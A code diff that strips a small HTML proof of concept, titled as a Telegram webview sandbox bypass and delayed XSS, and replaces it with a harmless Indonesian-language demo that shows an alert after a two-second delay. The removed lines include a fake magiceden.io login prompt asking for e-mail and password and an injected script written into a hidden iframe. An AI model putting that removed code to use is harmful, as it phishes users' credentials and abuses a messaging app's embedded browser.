@@ -1,34 +1,25 @@
-<html lang="en-US">
+<!DOCTYPE html>
+<html>
 <head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, user-scalable=no">
-	<title> Bypass sandbox Webview UXss Delayed JavaScript execution leak to host app (Telegram)</title>
-	
-	<style>
-		iframe {
-			visibility: hidden;
-		}
-	</style>
-   
-	<script>
-		window.onblur = function() {
-			document.getElementById("iframe").src = "javascript:prompt('In order to access magiceden.io\\nyou must first login on your\\nMagicEden Account.\\n\\nPlease type your e-mail\\nand your password:\\n', 'E-mail / Password.');";
-		}
-	</script>
+  <meta charset="UTF-8">
+  <title>Delay Popup Test</title>
 </head>
-
 <body>
-   <center>
-		<br>
-		<h1>Click Here</h1>
-	</center>
-   <iframe id="i"></iframe>
-<script>
-  setTimeout(() => {
-    let i = document.getElementById("i").contentWindow;
-    i.document.write("<script>alert('delayed XSS')<\/script>");
-  }, 2000);
-</script>
-</body>
+  <h2>Simulasi Jeda Sebelum Popup</h2>
 
+  <script>
+    // Fungsi memunculkan popup
+    function showPopup() {
+      alert("Popup muncul setelah jeda!");
+    }
+
+    // Fungsi dengan jeda
+    function delayedPopup(seconds) {
+      setTimeout(showPopup, seconds * 1000);
+    }
+
+    // Contoh: popup setelah 2 detik
+    delayedPopup(2);
+  </script>
+</body>
 </html>
